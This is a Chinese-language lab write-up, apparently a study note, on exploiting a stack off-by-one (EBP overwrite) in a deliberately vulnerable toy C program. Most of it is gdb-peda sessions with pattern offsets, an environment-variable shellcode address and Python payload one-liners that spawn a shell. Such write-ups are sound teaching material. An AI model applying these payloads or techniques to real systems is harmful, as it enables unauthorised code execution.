# 0x00 beginning

>What is off-by-one bug?

当被复制字符长度等于目的缓冲区的长度, 字符串结尾的`NULL`可能会覆盖和目的地址相邻的一个字节, 如果是在`stack`上面, 这个字节是函数调用者的`EBP`, 这个可能导致任意代码执行 [^origin].

存在的漏洞的代码:

```c
// gcc -fno-stack-protector -z execstack -mpreferred-stack-boundary=2

#include <stdio.h>
#include <string.h>

void foo(char* arg);
void bar(char* arg);

void foo(char* arg) {
 bar(arg); /* [1] */
}

void bar(char* arg) {
 char buf[256];
 strcpy(buf, arg); /* [2] */
}

int main(int argc, char *argv[]) {
 if(strlen(argv[1])>256) { /* [3] */
  printf("Attempted Buffer Overflow\n");
  fflush(stdout);
  return -1;
 }
 foo(argv[1]); /* [4] */
 return 0;
}
```

标号 [2] 处就是`off-by-one`发生的地方, 目的缓冲区长度是 256 而源字符串长度也是 256.

>It affects generated code in your binary. By default, GCC will arrange things so that every function, immediately upon entry, has its stack pointer aligned on **16-byte** boundary (this may be important if you have local variables, and enable sse2 instructions).
If you change the default to e.g. -mpreferred-stack-boundary=2, then GCC will align stack pointer on **4-byte boundary**. This will reduce stack requirements of your routines, but will crash if your code (or code you call) does use sse2, so is generally not safe.

编译选项`mpreferred-stack-boundary`, 参考 [这个](http://stackoverflow.com/questions/10251203/gcc-mpreferred-stack-boundary-option).

```shell

gdb-peda$ disassemble foo 
Dump of assembler code for function foo:
   0x080484cd <+0>:	push   ebp
   0x080484ce <+1>:	mov    ebp,esp
   0x080484d0 <+3>:	sub    esp,0x18
   ...
End of assembler dump.

gdb-peda$ disassemble foo 
Dump of assembler code for function foo:
   0x080484cd <+0>:	push   ebp
   0x080484ce <+1>:	mov    ebp,
   0x080484d0 <+3>:	sub    esp,0x4
   ...
End of assembler dump.

gdb-peda$ disassemble main
   0x08048588 <+0>:	push   ebp
   0x08048589 <+1>:	mov    ebp,esp
   0x0804858b <+3>:	and    esp,0xfffffff0
   ...
End of assembler dump.
   ...
   0x08048500 <+0>:	push   ebp
   0x08048501 <+1>:	mov    ebp,esp
   0x08048503 <+3>:	sub    esp,0x4
   ...
```

可以看见函数的序言部分, 栈抬高的大小不同,`foo`默认抬高是 24 字节,`main`是 16 字节, 通过上面的编译选项可以变成 4 字节.

# 0x01 分析

> 如何去获得任意代码执行?

这里去执行任意代码的技术叫`EBP overwrite`, 如果在内存布局当中调用者的`EBP`是位于`strcpy()`目的缓冲区之后, 那么`NULL`字节将会调用者的`EBP`的最后一字节覆盖掉.
看代码我们准备输入 256 字节的数据, 按照理论`NULL`会覆盖 foo 函数的`EBP`的最后字节为 00,

```shell
Sn0rt@warzone:~/lab$ gdb off_by_one2 
Reading symbols from off_by_one2...done.
gdb-peda$ b bar
gdb-peda$ r $(python -c 'print "A"*256')
gdb-peda$ next
[----------------------------------registers-----------------------------------]
...
EBP: 0xbffff5a0 --> 0xbffff500 ('A' <repeats 160 times>)
...
[-------------------------------------code-------------------------------------]
   0x80484f6 <bar+22>:	mov    DWORD PTR [esp],eax
   0x80484f9 <bar+25>:	call   0x8048380 <strcpy@plt>
=> 0x80484fe <bar+30>:	leave  
   0x80484ff <bar+31>:	ret    
[------------------------------------stack-------------------------------------]
...
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
14	   }
gdb-peda$ bt
#0  bar (arg=0xbffff7a0 'A' <repeats 200 times>...) at off_by_one.c:14
#1  0x080484de in foo (arg=0x41414141 <error: Cannot access memory at address 0x41414141>) at off_by_one.c:8
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
```
gdb 可以质疑 backtrace 的时候调用栈遭到了破坏, 在上面寄存器区域可以看到`EBP`变成了`0xbffff500`.

> EBP 被修改了与 EIP 什么关系?

按照内存布局,foo 调用 bar,bar 函数调用`strcpy()`在`strcpy()`返回时候,foo 的`ebp`被修改了一点, 但`ebp`边上的 4 个字节是原来 foo 返回 main 的转跳地址, 这里就控制程序突破的地方!

```x86asm
call:
    push, eip
    jmp lable
leave:
    mov ebp, esp;
    pop ebp;
ret:
    pop eip
```
上面这几条汇编指令理解可以帮助搞明白函数调用过程.

```shell
gdb-peda$ bt
#0  bar (arg=0xbffff7a0 'A' <repeats 200 times>...) at off_by_one.c:14
#1  0x080484de in foo (arg=0x41414141 <error: Cannot access memory at address 0x41414141>) at off_by_one.c:8
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
```
栈回溯时候 gdb 可以发现 foo 返回 main 的路线遭到了破坏.

```shell
gdb-peda$ next
[----------------------------------registers-----------------------------------]
...
EBP: 0xbffff500 ('A' <repeats 160 times>)
ESP: 0xbffff5a8 --> 0xbffff7a0 ('A' <repeats 200 times>...)
EIP: 0x80484de (<foo+17>:	leave)
...
[-------------------------------------code-------------------------------------]
   0x80484d3 <foo+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x80484d6 <foo+9>:	mov    DWORD PTR [esp],eax
   0x80484d9 <foo+12>:	call   0x80484e0 <bar>
=> 0x80484de <foo+17>:	leave  
   0x80484df <foo+18>:	ret    
[------------------------------------stack-------------------------------------]
...
Stopped reason: SIGSEGV
```

现在已经返回到 foo 了, 且准备继续像上返回, 这个时候问题暴露出来了, 违规了内存访问导致了`segment fault`.

# 0x02 how to use?

> What is the offset from destination buffer ?

快速定位还是很容易的, 先利用起来, 套路如下:

```shell
Sn0rt@warzone:~/lab$ gdb off_by_one2 
Reading symbols from off_by_one2...done.
gdb-peda$ pattern
pattern         pattern_arg     pattern_create  pattern_env     pattern_offset  pattern_patch   pattern_search  
gdb-peda$ pattern_arg 256
Set 1 arguments to program

gdb-peda$ r
Starting program: /home/Sn0rt/lab/off_by_one2 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b'

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xbffff470 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwA"...)
EBX: 0xb7fcd000 --> 0x1a9da8 
ECX: 0xbffff870 --> 0x58006225 ('%b')
EDX: 0xbffff56e --> 0xf5006225 
ESI: 0x0 
EDI: 0x0 
EBP: 0x6e414152 ('RAAn')
ESP: 0xbffff508 ("AoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b")
EIP: 0x41534141 ('AASA')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41534141
[------------------------------------stack-------------------------------------]
0000| 0xbffff508 ("AoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b")
0004| 0xbffff50c ("TAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b")
0008| 0xbffff510 ("AAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b")
0012| 0xbffff514 ("AqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b")
0016| 0xbffff518 ("VAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b")
0020| 0xbffff51c ("AAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b")
0024| 0xbffff520 ("AsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b")
0028| 0xbffff524 ("XAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41534141 in ?? ()
gdb-peda$ patte
patte           pattern         pattern_arg     pattern_create  pattern_env     pattern_offset  pattern_patch   pattern_search  
gdb-peda$ pattern
pattern         pattern_arg     pattern_create  pattern_env     pattern_offset  pattern_patch   pattern_search  
gdb-peda$ pattern offset AASA
AASA found at offset: 148
```
打算 BBBB 成功放入`EIP`, 测试一下

```shell
gdb-peda$ r $(python -c 'print  "A" *148 + "BBBB" + "C" * (256-148-4)')
Starting program: /home/Sn0rt/lab/off_by_one2 $(python -c 'print  "A" *148 + "BBBB" + "C" * (256-148-4)')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xbffff470 ('A' <repeats 148 times>, "BBBB", 'C' <repeats 48 times>...)
EBX: 0xb7fcd000 --> 0x1a9da8 
ECX: 0xbffff870 --> 0x58004343 ('CC')
EDX: 0xbffff56e --> 0xf5004343 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff508 ('C' <repeats 104 times>)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbffff508 ('C' <repeats 104 times>)
0004| 0xbffff50c ('C' <repeats 100 times>)
0008| 0xbffff510 ('C' <repeats 96 times>)
0012| 0xbffff514 ('C' <repeats 92 times>)
0016| 0xbffff518 ('C' <repeats 88 times>)
0020| 0xbffff51c ('C' <repeats 84 times>)
0024| 0xbffff520 ('C' <repeats 80 times>)
0028| 0xbffff524 ('C' <repeats 76 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```
准备一下 shellcode:

```shell
Sn0rt@warzone:~/lab$ export  SHELLCODE=$(cat shellcode.bin)
Sn0rt@warzone:~/lab$ ./getaddr SHELLCODE ./off_by_one
SHELLCODE will be at 0xbffff83c
gdb-peda$ r $(python -c 'print  "A" *148 + "B" * 4 + "C" * (256-148-4)')
Starting program: /home/Sn0rt/lab/off_by_one2 $(python -c 'print  "A" *148 + "B" * 4 + "C" * (256-148-4)')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xbffff470 ('A' <repeats 148 times>, "BBBB", 'C' <repeats 48 times>...)
...
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff508 ('C' <repeats 104 times>)
EIP: 0x42424242 ('BBBB')
...
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
...
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ r $(python -c 'print  "A" *148 + "\x3c\xf8\xff\xbf" + "C" * (256-148-4)')
Starting program: /home/Sn0rt/lab/off_by_one2 $(python -c 'print  "A" *148 + "\x3c\xf8\xff\xbf" + "C" * (256-148-4)')
process 6348 is executing new program: /bin/bash
sh-4.3$ 
```
到这里发现初步利用成功了.

```shell
Sn0rt@warzone:~/lab$ ./off_by_one2 $(python -c 'print  "A" *148 + "\x3c\xf8\xff\xbf" + "C" * (256-148-4)')
Segmentation fault (core dumped)
```
命令行下面发现 crash 了, 发现调试环境不同于命令行环境, 可能是是`ptrace()`导致了内存布局变化, 有待验证.

```shell
Sn0rt@warzone:~/lab$ gdb off_by_one2 /tmp/core.1464421157 
Reading symbols from off_by_one2...done.
[New LWP 6569]
Core was generated by `./off_by_one2 AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHA'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x25417325 in ?? ()
```
利用 peda 插件的的输出, 来测试分析一下.

```python
>>> chr(0x25)+chr(0x73)+chr(0x41)+chr(0x25)
'%sA%'
```
转换一下, 准备丢给 peda pattern offset 选项去计算.

```shell
gdb-peda$ pattern offset %sA%
%sA% found at offset: 212
Sn0rt@warzone:~/lab$ ./off_by_one2 $(python -c 'print  "A" *212 + "\x3c\xf8\xff\xbf" + "\x90" * (256-212-4)')
sh-4.3$ 
```
利用完成, 野蛮高效.

不过精确的方法不是这样猜的, 而是计算的.

> How to calculate the offset of return address from destination buffer 'buf'?

函数`foo`要返回`main`需要在`ebp`边上找到返回地址, 这个时候`ebp`上面的内容已经变成`buf`里面的内容了, 只用当在`foo`的`esp`减去`buf`坐在位置就是`eip`的 offset 了, 调试过程如下:

```shell
gdb-peda$ pattern_arg 256
Set 1 arguments to program
gdb-peda$ b bar 
Breakpoint 1 at 0x80484e9: file off_by_one.c, line 13.
gdb-peda$ c
The program is not being run.
gdb-peda$ r
Starting program: /home/Sn0rt/lab/off_by_one2 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b'
[----------------------------------registers-----------------------------------]
EAX: 0xbffff772 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwA"...)
EBX: 0xb7fcd000 --> 0x1a9da8 
ECX: 0x400008c2 
EDX: 0x2 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff570 --> 0xbffff57c --> 0xbffff588 --> 0x0 
ESP: 0xbffff468 --> 0x0 
EIP: 0x80484e9 (<bar+9>:	mov    eax,DWORD PTR [ebp+0x8])
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80484e0 <bar>:	push   ebp
   0x80484e1 <bar+1>:	mov    ebp,esp
   0x80484e3 <bar+3>:	sub    esp,0x108
=> 0x80484e9 <bar+9>:	mov    eax,DWORD PTR [ebp+0x8]
   0x80484ec <bar+12>:	mov    DWORD PTR [esp+0x4],eax
   0x80484f0 <bar+16>:	lea    eax,[ebp-0x100]
   0x80484f6 <bar+22>:	mov    DWORD PTR [esp],eax
   0x80484f9 <bar+25>:	call   0x8048380 <strcpy@plt>
[------------------------------------stack-------------------------------------]
...
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bar (
    arg=0xbffff772 "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwA"...) at off_by_one.c:13
13	   strcpy(buf, arg); /* [2] */
gdb-peda$ x buf
0xbffff470:	0xb7fff938
gdb-peda$ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xbffff470 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwA"...)
EBX: 0xb7fcd000 --> 0x1a9da8 
ECX: 0xbffff870 --> 0x58006225 ('%b')
EDX: 0xbffff56e --> 0xf5006225 
ESI: 0x0 
EDI: 0x0 
EBP: 0x6e414152 ('RAAn')
ESP: 0xbffff508 ("AoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b")
EIP: 0x41534141 ('AASA')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41534141
[------------------------------------stack-------------------------------------]
    ...
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41534141 in ?? ()
```

然后 esp - buf 找到 ebp 位置之前 4 字节就是 eip 开始位置.

```python
>>> 0xbffff508-0xbffff470
152
```
`eip`这次运行应该在 152 的地方, 但是测试完发现是 152-4 的地方, 不同于`sploitfun`写的.

加载环境变量里面的 shellcode, 测试一下这个计算.

```shell
gdb-peda$ r $(python -c 'print "A"*148 + "\x40\xf8\xff\xbf" + "C" * (256-148-4)')
Starting program: /home/Sn0rt/lab/off_by_one2 $(python -c 'print "A"*148 + "\x40\xf8\xff\xbf" + "C" * (256-148-4)')
[----------------------------------registers-----------------------------------]
EAX: 0xbffff772 ('A' <repeats 148 times>, "@\370\377\277", 'C' <repeats 48 times>...)
EBX: 0xb7fcd000 --> 0x1a9da8 
ECX: 0x400008c2 
EDX: 0x2 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff570 --> 0xbffff57c --> 0xbffff588 --> 0x0 
ESP: 0xbffff468 --> 0x0 
EIP: 0x80484e9 (<bar+9>:	mov    eax,DWORD PTR [ebp+0x8])
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80484e0 <bar>:	push   ebp
   0x80484e1 <bar+1>:	mov    ebp,esp
   0x80484e3 <bar+3>:	sub    esp,0x108
=> 0x80484e9 <bar+9>:	mov    eax,DWORD PTR [ebp+0x8]
   0x80484ec <bar+12>:	mov    DWORD PTR [esp+0x4],eax
   0x80484f0 <bar+16>:	lea    eax,[ebp-0x100]
   0x80484f6 <bar+22>:	mov    DWORD PTR [esp],eax
   0x80484f9 <bar+25>:	call   0x8048380 <strcpy@plt>
[------------------------------------stack-------------------------------------]
...
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bar (arg=0xbffff772 'A' <repeats 148 times>, "@\370\377\277", 'C' <repeats 48 times>...) at off_by_one.c:13
13	   strcpy(buf, arg); /* [2] */
gdb-peda$ c
Continuing.
process 7248 is executing new program: /bin/bash
Error in re-setting breakpoint 1: Function "bar" not defined.
sh-4.3$ 
```
看见成功了.

# doubt

* 我没有打开地址随机化, 这个 gdb 调试确认 offset 时候得出来的值都不同, 很奇怪.
* 还有`sploitfun`介绍用计算的方法, 我操作存在些问题 (可能是我没有搞懂), 我用`foo`的`esp`减去`buf`的地址是`foo`的`esp`在`buf`里面的 offset, 如果哪位知道可以告诉我!

### reference

[^origin]: [sploitfun](https://sploitfun.wordpress.com/2015/06/07/off-by-one-vulnerability-stack-based-2/)
